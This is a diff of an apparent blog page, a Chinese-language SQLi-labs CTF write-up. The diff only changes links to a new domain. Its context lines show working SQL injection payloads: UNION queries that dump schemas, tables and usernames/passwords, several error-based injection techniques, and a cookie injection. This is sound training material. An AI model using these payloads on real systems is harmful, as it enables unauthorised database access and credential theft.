@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SQLi-labs Basic Challenges | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="SQLi-labs Basic Challenges | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="SQLi-labs Basic Challenges | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -27,8 +27,8 @@ $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT ..." />
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -97,15 +97,15 @@ $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT ..." />
               <span class="page-view" key="20190425205400" title="SQLi-labs Basic Challenges">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/sqli/" class="post-tag">
+                <a href="https://3nd.xyz/tag/sqli/" class="post-tag">
                   # SQLi
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                <a href="https://3nd.xyz/tag/writeup/" class="post-tag">
                   # Writeup
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                <a href="https://3nd.xyz/tag/ctf/" class="post-tag">
                   # CTF
                 </a>
                 
@@ -113,9 +113,9 @@ $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT ..." />
             
                 <div class="post-content-wrapper">
                   <div class="post-content">
-                    <figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549198143185-cba3a637-7d3e-4215-a1e7-662142310b4f.png" alt="" loading="lazy"></figure>
+                    <figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/1549198143185-cba3a637-7d3e-4215-a1e7-662142310b4f.png" alt="" loading="lazy"></figure>
 <h2 id="error-based">Error based</h2>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549200569009-2d90d538-099a-4fbd-8a0b-2f4cc5e5d50f.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/1549200569009-2d90d538-099a-4fbd-8a0b-2f4cc5e5d50f.png" alt="" loading="lazy"></figure>
 <p>下面以 <strong>Less 1 GET-Error based-Single quotes-String</strong> 为例分析:</p>
 <pre><code class="language-php">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
 </code></pre>
@@ -131,28 +131,28 @@ $sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT ..." />
 <p><code>id = -1' union select 1,group_concat(schema_name),3 from information_schema.schemata --+</code></p>
 <pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--+' LIMIT 0,1
 </code></pre>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549195342935-7b56b398-2e05-4524-a2d3-62bdd69a6f90.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/1549195342935-7b56b398-2e05-4524-a2d3-62bdd69a6f90.png" alt="" loading="lazy"></figure>
 <ul>
 <li>爆(security)数据表</li>
 </ul>
 <p><code>id=-1' union select 1,group_concat(table_name),3 from information_schema.tables WHERE table_schema='security' --+</code></p>
 <pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema='security' --+' LIMIT 0,1
 </code></pre>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549195726863-9927dde1-73e7-40e8-8949-232995945cdc.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/1549195726863-9927dde1-73e7-40e8-8949-232995945cdc.png" alt="" loading="lazy"></figure>
 <ul>
 <li>爆(users)列</li>
 </ul>
 <p><code>id=id=-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_schema = 'security' AND table_name='users' --+</code></p>
 <pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE  table_schema = 'security' AND table_name='users' --+` LIMIT 0,1
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549196119537-bec64921-7bfc-479f-8292-10520cb8e005.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/1549196119537-bec64921-7bfc-479f-8292-10520cb8e005.png" alt="" loading="lazy"></figure>
 <ul>
 <li>爆数据</li>
 </ul>
 <p><code>id=-1' UNION SELECT id,username,password FROM users WHERE id = 3 --+</code></p>
 <pre><code class="language-sql">SELECT * FROM users WhERE id = '-1' UNION SELECT id,username,password FROM  users WHERE id = 3 --+` LIMIT 0,1
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549196396683-3511de3a-b925-414d-9f2e-135eed456e00.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/1549196396683-3511de3a-b925-414d-9f2e-135eed456e00.png" alt="" loading="lazy"></figure>
 <h2 id="double-injection">Double Injection</h2>
 <pre><code class="language-sql">$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
 </code></pre>
@@ -191,7 +191,7 @@ ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY 
 <h3 id="报错盲注">报错盲注</h3>
 <pre><code class="language-sql">UNION SELECT 1,count(*),concat(0x3a, 0x3a, (SELECT user()),0x3a,0x3a,floor(rand(0)*2))a FROM information_schema.columns GROUP BY a--+
 </code></pre>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549204477936-e36325ca-df26-4a82-a86e-bb38f6a66f99.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/1549204477936-e36325ca-df26-4a82-a86e-bb38f6a66f99.png" alt="" loading="lazy"></figure>
 <hr>
 <ul>
 <li><a href="https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/">BIGINT Overflow Error Based SQL Injection</a></li>
@@ -201,22 +201,22 @@ ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY 
 <p>利用double数值类型超出范围进行报错注入:</p>
 <pre><code class="language-sql">UNION SELECT (exp(~(SELECT * FROM (SELECT user())a))),2,3 --+
 </code></pre>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549204704344-e27ead96-e984-40ea-8e07-748e75ac5d91.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/1549204704344-e27ead96-e984-40ea-8e07-748e75ac5d91.png" alt="" loading="lazy"></figure>
 <p>利用bigint溢出进行报错注入：</p>
 <pre><code class="language-sql">UNION SELECT (!(SELECT * FROM (SELECT user())x) - ~0),2,4 --+
 </code></pre>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549205141215-9fb46d96-672c-45cc-977c-d30cd38910ae.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/1549205141215-9fb46d96-672c-45cc-977c-d30cd38910ae.png" alt="" loading="lazy"></figure>
 <p>利用xpath函数报错注入：</p>
 <pre><code class="language-sql"># mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误 
 AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) --+
 AND updatexml(1, concat(0x7e, (SELECT @@version), 0x7e), 1) --+
 </code></pre>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549205345651-77b286e1-921d-4506-9dd2-31cca35f41ef.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/1549205345651-77b286e1-921d-4506-9dd2-31cca35f41ef.png" alt="" loading="lazy"></figure>
 <p>利用数据的重复性报错注入:</p>
 <pre><code class="language-sql"># mysql 重复特性，此处重复了 version，所以报错。
 UNION SELECT 1,2,3 FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x --+
 </code></pre>
-<figure data-type="image" tabindex="11"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1549205633106-9eee82e3-f21c-4bb6-8f91-354fcbe0746d.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="11"><img src="https://3nd.xyz/post-images/move/1549205633106-9eee82e3-f21c-4bb6-8f91-354fcbe0746d.png" alt="" loading="lazy"></figure>
 <h3 id="延时注入">延时注入</h3>
 <ul>
 <li>利用sleep()函数进行注入：</li>
@@ -503,9 +503,9 @@ $insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES
 XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
 </code></pre>
 <h3 id="less-20-cookie-injection-uagent-field">Less 20 Cookie Injection / Uagent field</h3>
-<figure data-type="image" tabindex="12"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551451323683-caaadf24-eec8-4d9d-bb7f-37084ed27a8f.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="12"><img src="https://3nd.xyz/post-images/move/1551451323683-caaadf24-eec8-4d9d-bb7f-37084ed27a8f.png" alt="" loading="lazy"></figure>
 <p>Cookie: <code>uname = admin' and extractvalue(1,concat(0x7e,(select @@basedir),0x7e))#</code>。</p>
-<figure data-type="image" tabindex="13"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/1551451651325-788dfe81-f2f3-4d76-8a73-74401ed905d7.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://3nd.xyz/post-images/move/1551451651325-788dfe81-f2f3-4d76-8a73-74401ed905d7.png" alt="" loading="lazy"></figure>
 <p>Less 21 、Less 22 <code>cookie</code>进行了base64 encode, 分别为单引号和双引号闭合，注入姿势相同~</p>
 <blockquote>
 <p>参考: 《MySQL注入天书》</p>
@@ -565,7 +565,7 @@ XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-CTF-ljc-Web1-13-WriteUp/">
+              <a href="https://3nd.xyz/post/2019-04-25-CTF-ljc-Web1-13-WriteUp/">
                 <h3 class="post-title" style="text-align: left;">
                   CTF 论剑场 Web1-13 WriteUp
                 </h3>
@@ -576,7 +576,7 @@ XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-03-25-sqlmap-csrf-token/">
+              <a href="https://3nd.xyz/post/2019-03-25-sqlmap-csrf-token/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   sqlmap CSRF-token 绕过姿势
@@ -590,7 +590,7 @@ XPATH syntax error: '~5.7.23-0ubuntu0.16.04.1~'
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
